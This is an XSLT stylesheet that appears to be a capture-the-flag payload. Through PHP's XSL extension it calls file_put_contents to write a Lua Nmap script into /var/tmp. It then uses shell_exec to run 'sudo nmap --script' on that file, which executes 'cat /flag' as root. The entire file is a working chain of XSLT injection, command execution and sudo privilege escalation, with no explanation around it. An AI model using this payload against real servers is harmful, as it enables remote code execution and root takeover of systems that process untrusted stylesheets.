<?xml version="1.0"?>
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:php="http://php.net/xsl">

  <xsl:template match="*">
    <html><body>
      <h2>Escalation via NSE (cat /flag)</h2>
      <pre>
        <xsl:variable name="lua">
          os.execute("cat /flag")
        </xsl:variable>

        <xsl:value-of select="php:function('file_put_contents', '/var/tmp/root.nse', $lua)" />
        <xsl:text>&#10;</xsl:text>
        <xsl:value-of select="php:function('shell_exec', 'sudo nmap --script=/var/tmp/root.nse')" />
      </pre>
    </body></html>
  </xsl:template>

</xsl:stylesheet>
